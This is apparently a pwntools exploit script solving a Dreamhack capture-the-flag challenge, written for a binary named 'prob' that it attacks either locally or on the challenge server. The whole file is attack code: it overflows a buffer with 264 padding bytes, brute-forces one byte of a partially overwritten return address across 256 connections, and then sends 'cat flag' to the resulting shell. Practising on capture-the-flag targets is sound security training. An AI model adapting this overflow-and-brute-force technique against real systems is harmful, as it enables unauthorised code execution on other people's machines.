#!/usr/bin/env python3

from pwn import *

exe = ELF("./prob")

context.binary = exe

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("host8.dreamhack.games", 20465)

    return r


def main():
    for i in range(256):
        r = conn()
        
        payload = b"A" * 264
        payload += p8(i)

        r.sendlineafter(b"Enter size: ", str(len(payload)).encode())
        r.send(payload)
        
        try:
            r.sendline(b"cat flag")
            log.success(r.recvline()[:-1].decode())
            break
        except:
            r.close()
            continue


if __name__ == "__main__":
    main()